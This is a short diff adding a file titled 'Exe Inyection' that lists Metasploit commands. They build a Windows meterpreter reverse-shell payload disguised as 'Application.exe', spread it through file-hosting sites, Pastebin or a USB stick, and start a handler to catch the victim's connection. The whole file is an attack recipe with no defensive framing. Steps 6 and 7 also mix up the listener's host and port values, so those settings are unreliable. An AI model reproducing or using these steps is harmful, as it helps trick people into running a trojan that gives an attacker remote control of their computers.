@@ -1,0 +1,10 @@
+:: Exe Inyection ::
+
+1- msfpayload windows/meterpreter/reverse_tcp LHOST=<MY_Local_IP> LPORT=4444 x >/root/Download/Application.exe
+2- upload to mediafire.com, Pastebin, My own Hosting, or USB Stick.
+3- msfconsole
+4- use exploit/multi/handler
+5- set PAYLOAD windows/meterpreter/reverse_tcp
+6- set LHOST <REMOTE_IP>
+7- set LPORT <LOCAL_IP>
+8- exploit
